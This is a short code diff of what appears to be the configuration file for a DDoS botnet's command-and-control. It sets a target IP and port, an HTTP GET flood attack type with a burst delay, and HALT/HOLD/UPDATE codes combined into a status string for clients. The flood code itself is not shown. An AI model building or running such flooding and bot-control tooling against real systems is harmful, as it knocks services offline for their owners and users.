@@ -1,8 +1,17 @@
-ATTACK_TARGET_HOST = "192.168.0.109" # IP address of the machine to be attacked.
+ATTACK_TARGET_HOST = "192.168.0.174" # IP address of the machine to be attacked.
 ATTACK_TARGET_PORT = "80" # Port Number of the machine to be attacked.
 
-# Type of Attack
-ATTACK_TYPE = "HTTP_FLOOD"
+#################################################################################
+
+# Type of Attacks (Other Attacks are not yet supported)
+	#HTTPFLOOD - Floods the target system with GET requests.
+
+ATTACK_TYPE = "HTTPFLOOD"
+
+# Number of seconds delay between the burst of requests. 0 for No Delay
+ATTACK_BURST_SECONDS = "1" 
+
+#################################################################################
 
 #Status codes that has to be set from the below list. 
 	# HALT - To stop attacks immediately.
@@ -10,6 +19,9 @@ ATTACK_TYPE = "HTTP_FLOOD"
 	# HOLD - Wait for command.
 	# UPDATE - Update Client.
 
-ATTACK_STATUS = "HALT" # Choose any one Flag from above
+ATTACK_CODE = "HALT" # Choose any one Flag from above
 
-ATTACK_STATUS = ATTACK_TARGET_HOST + "_" + ATTACK_TARGET_PORT + "_" + ATTACK_STATUS
+#################################################################################
+
+
+ATTACK_STATUS = ATTACK_TARGET_HOST + "_" + ATTACK_TARGET_PORT + "_" + ATTACK_CODE + "_" + ATTACK_TYPE + "_" + ATTACK_BURST_SECONDS
